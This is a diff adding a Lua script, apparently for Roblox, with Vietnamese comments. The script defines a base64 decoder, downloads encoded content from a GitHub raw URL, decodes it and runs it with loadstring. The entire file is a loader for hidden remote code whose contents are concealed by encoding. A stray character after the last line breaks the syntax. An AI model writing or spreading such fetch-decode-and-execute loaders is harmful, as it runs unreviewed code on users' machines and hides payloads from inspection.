@@ -1,0 +1,52 @@
+local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+local function decodeBase64(data)
+    data = string.gsub(data, '[^'..b..'=]', '')
+    local dec = {}
+    local lut = {}
+    for i = 1, #b do lut[b:sub(i, i)] = i - 1 end
+    
+    local i = 1
+    while i <= #data do
+        local c1 = lut[data:sub(i, i)] or 0
+        local c2 = lut[data:sub(i+1, i+1)] or 0
+        local c3 = lut[data:sub(i+2, i+2)] or 0
+        local c4 = lut[data:sub(i+3, i+3)] or 0
+        
+        local b1 = bit32.bor(bit32.lshift(c1, 2), bit32.rshift(c2, 4))
+        table.insert(dec, string.char(b1))
+        
+        if data:sub(i+2, i+2) ~= '=' and i+2 <= #data then
+            local b2 = bit32.bor(bit32.lshift(bit32.band(c2, 15), 4), bit32.rshift(c3, 2))
+            table.insert(dec, string.char(b2))
+        end
+        
+        if data:sub(i+3, i+3) ~= '=' and i+3 <= #data then
+            local b3 = bit32.bor(bit32.lshift(bit32.band(c3, 3), 6), c4)
+            table.insert(dec, string.char(b3))
+        end
+        
+        i = i + 4
+    end
+    
+    return table.concat(dec)
+end
+
+-- Link Raw mới: cc3m
+local rawUrl = "https://raw.githubusercontent.com/PainPH10/13-9/refs/heads/main/cc3m?v=" .. math.random(1, 100000)
+
+local success, result = pcall(function()
+    local encodedData = game:HttpGet(rawUrl)
+    local decodedCode = decodeBase64(encodedData)
+    
+    local func, err = loadstring(decodedCode)
+    if func then
+        func()
+    else
+        warn("LỖI CÚ PHÁP LUA GỐC:", err)
+    end
+end)
+
+if not success then
+    warn("LỖI TẢI FILE:", result)
+endẻ
